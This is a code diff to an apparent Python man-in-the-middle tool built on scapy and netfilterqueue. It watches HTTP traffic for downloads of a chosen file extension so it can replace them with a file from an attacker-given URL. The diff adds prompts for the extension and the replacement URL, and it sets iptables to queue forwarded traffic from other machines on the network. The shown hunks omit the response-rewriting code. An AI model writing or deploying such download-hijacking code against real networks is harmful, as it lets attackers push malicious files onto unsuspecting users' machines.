@@ -10,7 +10,7 @@ def process_packet(packet):
         if scapy_packet.haslayer(Raw):
             if scapy_packet.haslayer(TCP):
                 if scapy_packet[TCP].dport == 80:
-                    if extension in scapy_packet[Raw].load.decode("utf-8") and url not in scapy_packet[Raw].load.decode("utf-8"):
+                    if extension in scapy_packet[Raw].load.decode("utf-8") and url.split('/')[-1] not in scapy_packet[Raw].load.decode("utf-8"):
                         print('[+] File request Detected')
                         ack_list.append(scapy_packet[TCP].ack)
                 elif scapy_packet[TCP].sport == 80:
@@ -30,16 +30,18 @@ def process_packet(packet):
 
 
 
-def main():
+def run():
     global extension, url
-    #subprocess.call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0',shell=True)
+    extension = str(input(">> Type file extension to intercept: "))
+    url = str(input(">> Replace with [file url]: "))
+    if extension[0] != '.':
+        extension = '.' + extension
+    subprocess.call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0',shell=True)
     #subprocess.call('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000' , shell=True) 
-    subprocess.call('iptables -I INPUT -j NFQUEUE --queue-num 1',shell=True)
-    subprocess.call('iptables -I OUTPUT -j NFQUEUE --queue-num 1',shell=True)
-
-    extension = str(input("Type file extension to intercept: "))
-    url = str(input("Type url: "))
-    print('[+] iptables configured')
+    # subprocess.call('iptables -I INPUT -j NFQUEUE --queue-num 1',shell=True)
+    # subprocess.call('iptables -I OUTPUT -j NFQUEUE --queue-num 1',shell=True)
+    print('[+] Iptables configured')
+    print("[+] Waiting for " + extension +  " downloads")
     queue = netfilterqueue.NetfilterQueue()
     queue.bind(1,process_packet)
     try:
@@ -47,6 +49,3 @@ def main():
     except KeyboardInterrupt:
         subprocess.call('iptables --flush',shell=True)
         print('\n[+] iptables flushed.')
-
-
-main()
